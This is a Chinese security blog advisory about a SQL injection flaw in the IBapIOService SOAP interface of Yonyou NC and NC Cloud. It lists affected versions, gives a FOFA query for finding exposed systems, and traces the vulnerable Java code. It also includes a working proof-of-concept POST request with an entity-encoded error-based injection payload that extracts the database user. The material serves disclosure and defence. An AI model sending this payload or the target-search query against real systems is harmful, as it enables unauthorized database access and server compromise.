---
title: "用友NC及NC Cloud系统 IBapIOService SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uapws-service-IBapIOService-getBapTable-sqli.html
asset_dir: assets/用友nc及nc-cloud系统-ibapioservice-sql注入漏洞
---

# 用友NC及NC Cloud系统 IBapIOService SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/17 08:22
- 1276浏览
- [0评论](#comment)
- 46分钟阅读

深入探索

企业资源规划

软件

身份验证

---

# 漏洞简介

用友 NC [Cloud](#) 是一种商业级的[企业资源规划](#)云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC Cloud nc.itf.bap.service.IBapIOService 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

云存储

# 影响版本

NC65、NCC1903、NCC1909、NCC2005、NCC2105、NCC2111

# fofa语法

> `body="html/downloadBroswer.html" && body="platform/pub/welcome.do"`

# 漏洞分析

深入探索

VPN服务

文件大小转换

编程语言教程

看下 nc.itf.bap.service.IBapIOService 的业务逻辑实现

```
public BapTableEntity[] getBapTable(String... tableIds) throws Exception {
        PerfWatch pw = new PerfWatch(NCLangRes4VoTransl.getNCLangRes().getStrByID("8001006_0", "08001006-0271") + StringTools.arr2Str(tableIds, ","));

        BapTableEntity[] tableList;
        try {
            if (!ArrayUtils.isEmpty(tableIds)) {
                List<BapTableEntity> tableList = new ArrayList();

                for(String tableId : tableIds) {
                    MetaTableDef tableDef = null;

                    try {
                        tableDef = this.getMetaDef(tableId);
                    } catch (Exception e) {
                        pw.appendMessage(e.getMessage());
                        throw e;
                    }

                    if (tableDef != null) {
                        tableList.add(BapTableEntity.valueof(tableDef));
                    }
                }
```

深入探索

网络安全会议

技术文章订阅

Docker加速服务

`tableIds` 带入 `getMetaDef` 函数，其实现逻辑如下

SQL注入防护

```
private MetaTableDef getMetaDef(String tableId) throws SmartMetaException {
        String[] splits = tableId.split("@");
        if (!ArrayUtils.isEmpty(splits) && splits.length >= 2) {
            MetaTableDef tableDef = SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName(splits[1], splits[0]);
            if (tableDef == null) {
```

对传入的 `tableIds` 按照 `@` 分割成数组，再将分割后的数组0 和 数组1 带入 `SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName` 函数，其实现逻辑如下

```
public MetaTableDef getMetaTableByTableName(String dsName, String tableName) throws SmartMetaException {
        if (StringUtils.isEmpty(tableName)) {
            return null;
        } else {
            String clause = " upper(tableid)='" + tableName.toUpperCase() + "' ";
            if (StringUtils.isEmpty(dsName)) {
                clause = clause + "and isnull(dsname,'~')='~' ";
            } else {
                clause = clause + "and upper(dsname)='" + dsName.toUpperCase() + "'";
            }

            Object[] datas = (new DAOAction()).loadByClause(MetaTable.class, SmartConfigCache.getDsName4Design(), clause);
```

数组1 代表 dsName，数组0 代表 tableName，分别将两个数组部分拼接在SQL语句中，造成SQL注入漏洞。

代码安全审计

根据报错也可以看到拼接结果

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-001-d0369b1885ff.webp)](https://image.mrxn.net/c97f3430303a4e3caa30df44c9f1e332.webp)

```
sql:SELECT guid,dsname,tableid,displayname,displayname2,displayname3,displayname4,displayname5,displayname6,moduleid,authtype,help,creationtime,modifiedtime,creator,modifier,pk_org,pk_group,dirguid,dr,ts,assetLayer,assetIndustry FROM bi_md_table WHERE  upper(tableid)='DWQUEUE' and upper(dsname)='MESSAGEQUEUE'OR 1 IN (SELECT HOST_NAME())' Unclosed quotation mark after the character string ''.
```

# 漏洞复现

直接访问 wsdl 获取原始 wsdl 内容

漏洞预警服务

```
GET /uapws/service/nc.itf.bap.service.IBapIOService?wsdl HTTP/1.1
Host: ncc.mrxn.net
```

直接使用 [Burp Suite](https://mrxn.net/tag/burpsuite) 自带的API 扫描 扫描此soap api接口即可得到HTTP请求报文。

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-002-5b728a0f57d4.webp)](https://image.mrxn.net/be646aab59614d8c81d6d6e73c74ab62.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)验证

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: ncc.mrxn.net
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
    <soapenv:Header>
    <soapenv:Body>
        <gs:getBapTable>
            <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;</gs:stringarrayItem>
        </gs:getBapTable>
    </soapenv:Body>
</soapenv:Envelope>
```

通过报错注入，成功在响应回显数据库用户信息

企业资源规划

[![用友NC及NC Cloud系统 IBapIOService SQL注入漏洞](images/img-003-c51adc63d4f1.webp)](https://image.mrxn.net/de60bfd2757d409d9b21bcd1ebbfa85c.webp)

针对 mssql 数据库可使用延时或堆叠注入进行验证。

# 解决方案

打对应补丁，重启服务

软件

# 参考

- <https://security.yonyou.com/#/noticeInfo?id=401>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.解决方案](#toc-6-)
- [7.参考](#toc-7-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
